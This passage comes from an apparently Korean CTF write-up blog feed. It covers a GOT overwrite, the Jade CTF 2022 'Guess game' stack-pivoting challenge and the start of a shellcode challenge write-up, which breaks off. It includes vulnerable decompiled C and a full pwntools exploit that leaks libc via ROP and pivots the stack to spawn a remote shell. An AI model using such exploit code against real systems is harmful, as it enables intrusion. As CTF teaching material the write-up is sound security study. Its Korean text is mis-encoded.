0x7fa31ac97050</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x007fa31ac97000 0x007fa31ac99000 0x000000001d8000 rw- /usr/lib/libc.so.6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>*ABS*@got.plt</code> ì£¼ì†Œë¥¼ ì°¸ì¡°í•´ì„œ jmpí•˜ë¯€ë¡œ giftë¡œ ë°”ê¿”ì„œ ìµìŠ¤í•˜ë©´ ë  ë“¯ í•˜ë‹¤. í’€ë ë¡œ ìž„ì—ë„ ë¶ˆêµ¬í•˜ê³  ì“°ê¸° ê¶Œí•œì´ ì¡´ìž¬í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x00007fa31ac27920</span><br></pre></td></tr></table></figure><p>overwriting í›„.. <code>*ABS*@got.plt</code> ì£¼ì†Œì— gift ì£¼ì†Œë¥¼ ì €ìž¥ì‹œí‚¬ ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x0000558eefe46257</span><br></pre></td></tr></table></figure><p>ì´ í›„ì— <code>puts</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤ë©´ gift í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²ƒì´ë‹¤.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>Demon íŒ€ìœ¼ë¡œì¨ CTF ë¬¸ì œë¥¼ ì¶œì œí•œ ê²ƒ ì¤‘ì— ê°€ìž¥ ê³µì„ ë“¤ì˜€ê³  ì˜¤ëž˜ê±¸ë ¸ë‹¤. ìµœì‹  libcë¥¼ ê°€ì§„ ë¬¸ì œëŠ” ë§Žì´ í’€ì´ë¥¼ ì•ˆí•´ë´ì„œ ë‘ ë²ˆì§¸ ìµìŠ¤ ë°©ë²•ì€ ëª°ëžë‹¤. ìƒˆë¡œìš´ ê²ƒì„ ë°°ì›Œì„œ ê¸°ë¶„ì´ ì¢‹ë‹¤ :) ì´ ë¬¸ì œ ë•ë¶„ì— ìµœì‹  libcë„ ë¶„ì„ì„ í•´ë³´ì•˜ëŠ”ë° ê´€ë ¨ ë‚´ìš©ì€ Docs ì¹´í…Œê³ ë¦¬ì— (ì–¸ì  ê°„) ì—…ëŽƒí•  ì˜ˆì •ì´ë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> POXX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FULL RELRO </tag>
            
            <tag> Power Of XX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Guess game (Stack pivoting)</title>
      <link href="/221028-jadectf2022-guess_game/"/>
      <url>/221028-jadectf2022-guess_game/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(16&#x2F;630) solves</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ chall</span><br><span class="line">â””â”€â”€ libc.so.6</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  fill_secret_buffer();</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Welcome to my game, choose any number between 1-10\n&quot;</span>, <span class="number">0x33</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter a number: &quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> || v4 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Wrong number entered\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    odd_option();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    even_option();                              <span class="comment">// not vuln</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Bye bye\n&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main í•¨ìˆ˜ì—ì„œ ìˆ˜ í•˜ë‚˜ë¥¼ ìž…ë ¥ë°›ëŠ”ë° 0ë¶€í„° 9ì‚¬ì´ì˜ ë²”ìœ„ë§Œ ì¸ì •í•œë‹¤. ê·¸ ë‹¤ìŒ &amp; ì—°ì‚°ì„ ì§„í–‰í•˜ëŠ”ë° ìž…ë ¥ ê°’ì´ í™€ìˆ˜ë¼ë©´ <code>odd_option()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê³  ì•„ë‹ˆë¼ë©´ <code>even_option()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•œë‹¤. í›„ìžì˜ í•¨ìˆ˜ì— ì·¨ì•½ì ì´ ì—†ê¸° ë•Œë¬¸ì— ê°„ë‹¨í•˜ê²Œ ë¨¼ì € ì‚´íŽ´ë³´ìž.</p><h4 id="1-even-option"><a href="#1-even-option" class="headerlink" title="1. even_option()"></a>1. even_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">even_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter your name: &quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;Hello %s, we are sorry but you gave us the wrong input. Please try again.\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">2</span>, temp_buffer, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì§€ì—­ë³€ìˆ˜ sì— ì´ë¦„ì„ ìž…ë ¥ë°›ëŠ”ë‹¤. bofê°€ ì¼ì–´ë‚  ê°€ëŠ¥ì„±ì„ ì—¼ë‘ì— ë’€ì§€ë§Œ 108 í¬ê¸°ì— 100ë§Œí¼ ìž…ë ¥í•˜ê¸° ë•Œë¬¸ì— bofëŠ” ì¼ì–´ë‚˜ì§€ ì•ŠëŠ”ë‹¤. ì´ í•¨ìˆ˜ì—ì„œ ì·¨ì•½ì ì€ ë°œìƒí•˜ì§€ ì•ŠëŠ”ë‹¤. </p><h4 id="2-odd-option"><a href="#2-odd-option" class="headerlink" title="2. odd_option()"></a>2. odd_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">odd_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">108</span>]; <span class="comment">// [rsp+D0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+13Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Let&#x27;s begin, but first here is how you play:\n&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- A number will be shown to you\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- You have to enter two strings\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The first should be your name\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The second string should be equal to the secret code\n&quot;</span>, <span class="number">0x39</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- If you successfully guess the secret code, you win!\n&quot;</span>, <span class="number">0x36</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;\nHere&#x27;s the number: %lld\n&quot;</span>, s);</span><br><span class="line">  write(<span class="number">2</span>, temp_buffer, v3);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter first input please: &quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter second input please: &quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  fgets(dest, <span class="number">130</span>, <span class="built_in">stdin</span>); <span class="comment">// bof</span></span><br><span class="line">  result = <span class="built_in">strcpy</span>(dest, secret_buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Congrats! You win!\n&quot;</span>, <span class="number">0x13</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>208 í¬ê¸°ì˜ ì§€ì—­ë³€ìˆ˜ sì— 200ë§Œí¼ ìž…ë ¥í•˜ê³  108 í¬ê¸°ì˜ ì§€ì—­ë³€ìˆ˜ destì— 130ë§Œí¼ ìž…ë ¥í•œë‹¤. ì—¬ê¸°ì„œ bofê°€ ë°œìƒí•œë‹¤. ë°”ë¡œ ë’¤ì— srctpyí•¨ìˆ˜ì—ì„œ secret_bufferë¥¼ destì— ë³µì‚¬í•œë‹¤.<br>ì´ í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ê¸° ì „ì— mainì—ì„œ <code>fill_secret_buffer()</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ë° ì—¬ê¸°ì„œ secret_buffer ì „ì—­ë³€ìˆ˜ë¥¼ ì±„ìš´ë‹¤.</p><p>ê²°ë¡ ì ìœ¼ë¡œ ì•Œì•„ë‚¸ ê²ƒì€ ì§€ì—­ë³€ìˆ˜ destì—ì„œ 130-0x70 ì¦‰, 18ë§Œí¼ overflowê°€ ë‚œë‹¤ëŠ” ê²ƒì´ë‹¤.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>overflowê°€ 18ë§Œí¼ë‚œë‹¤? sfp(rbp), ret..</p><p>retê¹Œì§€ ì•ˆì „í•˜ê²Œ ë®ê³  2ë°”ì´íŠ¸ ë” overflowê°€ ë‚œë‹¤. ROPë¥¼ í•˜ê¸°ì—ëŠ” overflowê°€ ì¶©ë¶„ížˆ ë‚˜ì§€ ì•ŠëŠ”ë‹¤. ì´ëŸ´ ë•Œ í•´ì•¼í•˜ëŠ” ê²ƒì´ Stack pivotingì´ë‹¤. ì´ì™€ ê´€ë ¨í•´ì„œëŠ” (êµ¬ ë¸”ë¡œê·¸ì—ë„ ì¨ë†¨ì§€ë§Œ) ì‹œê°„ì´ ëœë‹¤ë©´ ì´ ë¸”ë¡œê·¸ì— ê¸€ì„ ìƒˆë¡œ ì“¸ ì˜ˆì •ì´ë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>overflowê°€ retê¹Œì§€ ë‚  ë•ŒëŠ” stack pivoting ê¸°ë²•ì„ ê³ ë ¤í•´ë³¼ ìˆ˜ ìžˆê² ë‹¤. ì´ë¥¼ ìœ„í•´ì„œ fake stackì„ êµ¬ì„±í•  ê³µê°„ì´ í•„ìš”í•˜ë‹¤. ì´ ë¬¸ì œì—ì„œëŠ” â€œEnter first input please: â€œì—ì„œ ì§€ì—­ë³€ìˆ˜ sì— 200ë§Œí¼ ìž…ë ¥í•  ìˆ˜ ìžˆë‹¤. 200ë°”ì´íŠ¸ë©´ ROP íŽ˜ì´ë¡œë“œë¥¼ ì ê¸°ì— ì¶©ë¶„í•˜ë‹¤. ì—¬ê¸°ë¥¼ fake stackìœ¼ë¡œ í•œë‹¤! ë•…ë•…</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="PART1"><a href="#PART1" class="headerlink" title="PART1"></a>PART1</h4><ol><li>libc leakí•˜ëŠ” ROP íŽ˜ì´ë¡œë“œë¥¼ ìž‘ì„±í•˜ì—¬ stackì— êµ¬ì„±</li><li>ìœ„ stackìœ¼ë¡œ íë¦„ ë³€ê²½</li></ol><h4 id="PART2"><a href="#PART2" class="headerlink" title="PART2"></a>PART2</h4><ol><li><code>system(&#39;/bin/sh\x00&#39;)</code>ì„ í˜¸ì¶œí•˜ëŠ” ROP íŽ˜ì´ë¡œë“œë¥¼ ìž‘ì„±í•˜ì—¬ stackì— êµ¬ì„±</li><li>ìœ„ stackìœ¼ë¡œ íë¦„ ë³€ê²½</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400946</span></span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line"></span><br><span class="line">fake_stack= <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>])</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">stack_pivoting_gadget = <span class="number">0x0400B1C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;libc leak :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;offset :: &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak 2 :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">fake_stack = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(binsh)</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;p1v0t!_p1v0t!_p1v0t!&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>ë‹¤ í’€ê³  ë‚˜ì„œ ë¡¸ì—… ìž‘ì„±í•˜ëŠ”ë° ë¬¸ì œ í’€ ë•ŒëŠ” ëª» ë´¤ë˜ í•¨ìˆ˜ë¥¼ ë°œê²¬í–ˆë‹¤..ã…‹ã…‹ ì´ í•¨ìˆ˜ë¥¼ ì§„ìž‘ì— ë´¤ë”ë¼ë©´ ë” ì‰½ê²Œ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìžˆì—ˆì„ í…ë°.. ê·¸ëŸ°ë° ì´ëŸ° ìƒê°ì„ ê°€ì§€ë©´ ì•ˆëœë‹¤. ì´ ë¬¸ì œ ë•ì— ìŠ¤íƒ í”¼ë´‡íŒ… ë¦¬ë§ˆì¸ë“œí–ˆìœ¼ë‹ˆê¹Œ~ ì˜¤ížˆë ¤ ì¢‹ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">hidden_level</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n&quot;</span>, <span class="number">0x4F</span>uLL);</span><br><span class="line">  result = fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Did you cheat?\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>ëŠ¦ìž¥ ë¶€ë¦¬ë‹¤ê°€ ë¡¸ì—…ì„ ë„ˆë¬´ ëŠ¦ê²Œ ìž‘ì„±í–ˆë‹¤. ì´ ì”¨í…â€¦ ì„œë²„ ì˜¤ëž˜ ì‚´ì•„ìžˆì–´ì„œ ì¢‹ì•˜ëŠ”ë° ë¡¸ì—… ìž‘ì„±í•  ë‹¹ì‹œ ì„œë²„ê°€ ë‹«í˜”ë‹¤. ë¡¸ì—…ì€.. ì œë•Œì œë•Œ ë¹¨ë¦¬ë¹¨ë¦¬ ìž‘ì„±í•˜ìž T_T.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Roll the dice (Shellcode, NOP Sled)</title>
      <link href="/221028-jadectf2022-roll_the_dice/"/>
      <url>/221028-jadectf2022-roll_the_dice/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(18&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Roll the dice, enter the coupon. Did you win? No? No worries. Try again. Lifeâ€™s all about chances.</p><p>nc 34.76.206.46 10006</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â””â”€â”€ chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">choose_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span 